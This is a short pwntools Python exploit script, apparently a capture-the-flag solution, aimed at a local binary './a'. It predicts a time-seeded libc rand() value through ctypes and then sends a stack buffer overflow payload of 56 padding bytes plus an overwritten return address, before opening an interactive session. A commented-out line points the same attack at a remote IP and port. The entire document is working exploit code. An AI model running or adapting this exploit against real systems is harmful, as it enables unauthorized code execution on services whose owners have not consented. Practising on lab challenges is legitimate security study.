from pwn import *
import ctypes
context.terminal = ['tmux', 'splitw', '-h']
context(log_level='debug',arch='amd64',os='linux')
io = process("./a")
libc=ELF("./libc-2.35.so")
#io=remote("219.216.65.41",35862)

elf1=ctypes.CDLL("./libc-2.35.so")
elf1.srand(elf1.time(0))
payload=p64(elf1.rand()%100+1)
io.recv()
gdb.attach(io)
io.send(payload)

io.sendline(b'a'*56+p64(0x40134B))


io.interactive()